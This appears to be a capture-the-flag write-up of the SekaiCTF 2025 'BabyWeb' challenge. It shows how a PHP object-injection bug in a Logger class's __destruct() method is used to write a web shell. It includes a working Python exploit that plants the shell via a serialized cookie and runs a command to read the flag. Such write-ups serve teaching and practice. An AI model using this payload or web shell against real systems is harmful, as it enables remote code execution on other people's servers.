---
title: "BabyWeb — Insecure Deserialization"
pubDate: "2025-07-14"
event: "SekaiCTF 2025"
author: "0xCat"
score: "200 pts"
tags: ["web"]
description: "PHP Object Injection exploiting custom magic methods to achieve remote code execution."
---

# BabyWeb (Web - 200 pts)

## Overview
BabyWeb vulnerable endpoint accepts a serialized PHP cookie string. Inspecting the source code reveals a magic `__destruct()` call in `Logger` class:

```php
class Logger {
    public $file = "log.txt";
    public $data = "";
    public function __destruct() {
        file_put_contents($this->file, $this->data);
    }
}
```

## Crafting Payload
We instantiate `Logger` targeting `shell.php`:

```python
import requests

payload = 'O:6:"Logger":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}'
r = requests.post("https://babyweb.sekai.ctf/api", cookies={"session": payload})

# Execute command
r2 = requests.get("https://babyweb.sekai.ctf/shell.php?cmd=cat%20/flag.txt")
print(r2.text)
```

Flag: `SEKAI{php_d3s3r14l1z4t10n_p0p_ch41n}`.
